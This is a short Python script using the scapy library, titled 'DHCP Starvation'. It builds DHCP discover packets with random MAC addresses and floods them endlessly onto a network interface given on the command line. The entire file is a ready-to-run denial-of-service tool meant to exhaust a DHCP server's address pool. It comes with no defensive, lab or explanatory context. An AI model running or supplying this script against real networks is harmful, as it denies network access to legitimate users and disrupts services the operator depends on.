from scapy.all import *
import argparse
conf.checkIPaddr = False

dhcp_discover = Ether(dst="FF:FF:FF:FF:FF:FF", src=RandMAC())\
    /IP(src="0.0.0.0", dst="255.255.255.255")\
    /UDP(sport=68, dport=67)\
    /BOOTP(op=1,chaddr = RandMAC())\
    /DHCP(options=[('message-type', 'discover'),('end')])

parser = argparse.ArgumentParser(prog="DHCP Starvation",
    description="Starving the DHCP server")
parser.add_argument("interface",help="Interface on what to transmit the dhcp packets")
args = parser.parse_args()

sendp(dhcp_discover, iface=args.interface,loop=1,verbose=1)